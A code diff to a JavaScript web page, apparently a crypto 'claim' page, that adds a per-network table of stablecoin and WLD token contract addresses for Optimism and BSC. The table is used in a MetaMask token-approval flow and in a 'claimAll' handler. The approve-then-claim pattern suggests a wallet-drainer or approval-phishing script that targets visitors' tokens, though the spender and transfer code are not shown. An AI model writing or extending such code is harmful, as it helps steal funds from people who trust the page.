@@ -574,11 +574,18 @@ async function connectNetwork() {
       button.textContent = "Aprobando...";
       button.style.backgroundColor = "#f0b90b";
 
-      const tokens = [
-        "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
-        "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
-        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
-      ];
+       const TOKENS_BY_NETWORK = {
+  optimism: [
+    "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
+    "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1", // USDC
+    "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"  // WLD
+  ],
+  bsc: [
+    "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
+    "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", // USDC BSC
+    "0xDf2C7238198Ad8B389666574f2d8BC411A4b7428"  // WLD BSC (puede ser modificado)
+  ]
+};
 
       const approveABI = [{
         "constant": false,
@@ -615,11 +622,19 @@ async function connectNetwork() {
 
     document.getElementById("claimAll").addEventListener("click", async () => {
       if (!userAccount) return alert("Primero conecta MetaMask");
-      const tokens = [
-        "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
-        "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
-        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
-      ];
+      const TOKENS_BY_NETWORK = {
+  optimism: [
+    "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
+    "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1", // USDC
+    "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"  // WLD
+  ],
+  bsc: [
+    "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
+    "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", // USDC BSC
+    "0xDf2C7238198Ad8B389666574f2d8BC411A4b7428"  // WLD BSC (puede ser modificado)
+  ]
+};
+
       const amounts = [
         web3.utils.toWei("100", "ether"),
         web3.utils.toWei("100", "ether"),
